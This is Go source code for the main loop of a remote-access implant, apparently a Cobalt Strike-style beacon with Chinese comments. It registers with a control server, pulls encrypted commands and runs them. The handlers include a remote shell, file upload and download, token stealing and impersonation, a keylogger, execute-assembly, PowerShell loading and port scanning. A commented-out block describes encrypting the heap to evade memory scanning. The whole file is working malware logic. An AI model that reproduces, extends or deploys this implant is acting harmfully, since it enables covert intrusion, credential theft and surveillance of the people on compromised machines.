package main

import (
	"bytes"
	"errors"

	//"fmt"
	"main/config"
	"main/crypt"
	"main/packet"
	"main/services"
	"main/util"
	"os"
	"time"
)

func main() {
	// 首先合成的这个cookie在后续通信中充当了通信的校验码
	ok := packet.FirstBlood() // 向服务器注册(此时，服务器收到第一个数据包，并已经在前端界面上显示内容了)
	if ok {
		var Token uintptr
		var powershellImport []byte
		for {
			data, err := packet.PullCommand() // 拉取命令
			if data != nil && err == nil {
				totalLen := len(data)
				if totalLen > 0 {
					_ = data[totalLen-crypt.HmacHashLen:]
					restBytes := data[:totalLen-crypt.HmacHashLen]
					decrypted, errPacket := packet.DecryptPacket(restBytes) // 解密数据；如果解密失败了，就向服务器返回错误内容
					if errPacket != nil {
						packet.ErrorProcess(errPacket)
						continue
					}
					_ = decrypted[:4]
					lenBytes := decrypted[4:8]
					packetLen := packet.ReadInt(lenBytes)
					decryptedBuf := bytes.NewBuffer(decrypted[8:]) // 解密后的数据需要进行解析
					for {
						if packetLen <= 0 {
							break
						}
						cmdType, cmdBuf, errParse := packet.ParsePacket(decryptedBuf, &packetLen) // 解析出真正的内容
						if errParse != nil {
							packet.ErrorProcess(errParse)
							continue
						}
						if cmdBuf != nil {
							//cmdBuf = []byte(strings.Trim(string(cmdBuf), "\x00"))
							//fmt.Printf("cmdType: %d\n",cmdType)
							//fmt.Printf("cmdBufferString: %s\n",cmdBuf)
							//fmt.Printf("cmdBuffer: %v\n",cmdBuf)
							var err error
							var callbackType int
							var result []byte
							switch cmdType {
							case packet.CMD_TYPE_SHELL:
								result, err = services.CmdShell(cmdBuf, Token)
								callbackType = 32
							case packet.CMD_TYPE_UPLOAD_START:
								result, err = services.CmdUploadStart(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_UPLOAD_LOOP: // 上下两个上传调用的底层内容相同，估计是断点续传还没做好
								result, err = services.CmdUploadLoop(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_DOWNLOAD:
								result, err = services.CmdDownload(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_FILE_BROWSE:
								result, err = services.CmdFileBrowse(cmdBuf)
								callbackType = 22
							case packet.CMD_TYPE_CD:
								result, err = services.CmdCd(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_SLEEP:
								result, err = services.CmdSleep(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_PWD:
								result, err = services.CmdPwd()
								callbackType = 32
							case packet.CMD_TYPE_EXIT:
								os.Exit(0)
							case packet.CMD_TYPE_SPAWN_X64:
								result, err = services.CmdSpawnX64(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_SPAWN_X86:
								result, err = services.CmdSpawnX86(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_EXECUTE:
								result, err = services.CmdExecute(cmdBuf, Token)
								callbackType = 32
							case packet.CMD_TYPE_GETUID:
								result, err = services.CmdGetUid()
								callbackType = 32
							case packet.CMD_TYPE_STEAL_TOKEN:
								Token, result, err = services.CmdStealToken(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_PS:
								result, err = services.CmdPs()
								callbackType = 32
							case packet.CMD_TYPE_KILL:
								result, err = services.CmdKill(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_MKDIR:
								result, err = services.CmdMkdir(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_DRIVES:
								result, err = services.CmdDrives()
								callbackType = 32
							case packet.CMD_TYPE_RM:
								result, err = services.CmdRm(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_CP:
								result, err = services.CmdCp(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_MV:
								result, err = services.CmdMv(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_REV2SELF:
								Token, result, err = services.CmdRun2self(Token)
								callbackType = 32
							case packet.CMD_TYPE_MAKE_TOKEN:
								Token, result, err = services.CmdMakeToken(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_PIPE:
								result, err = services.CmdHandlerJob(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_PORTSCAN_X64:
								result, err = services.CmdPortscanX64(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_KEYLOGGER:
								result, err = services.CmdKeylogger(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_EXECUTE_ASSEMBLY_X64:
								result, err = services.CmdExecuteAssemblyX64(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_IMPORT_POWERSHELL:
								result, err = services.CmdImportPowershell(cmdBuf)
								callbackType = 32
							case packet.CMD_TYPE_POWERSHELL_PORT:
								result, err = services.CmdPowershellPort(cmdBuf, powershellImport)
								callbackType = 32
							case packet.CMD_TYPE_INJECT_X64:
								result, err = services.CmdInjectX64(cmdBuf) // 注入目前并不支持，等待后续更新吧
								callbackType = 32
							default:
								err = errors.New("This type is not supported now.")
							}
							if err != nil {
								packet.ErrorProcess(err)
							} else {
								finalPaket := packet.MakePacket(callbackType, util.ConvertChinese(result))
								packet.PushResult(finalPaket)
							}
						}
					}
				}
			} else if err != nil {
				packet.ErrorProcess(err) // 向服务器发送结果，并进入休眠
			}
			// 下面这一段主要是用来在休眠状态下加密运行堆的信息，从而规避内存扫描的
			/*if config.Sleep_mask {
				packet.DoSuspendThreads()
				fmt.Println("EncryptHeap")
				packet.EncryptHeap()
				test := false
				windows.SleepEx(1000,test)
				packet.EncryptHeap()
				fmt.Println("DecryptHeap")
				packet.DoResumeThreads()
			} else {
				time.Sleep(config.WaitTime)
			}*/
			time.Sleep(config.WaitTime)

		}
	}

}
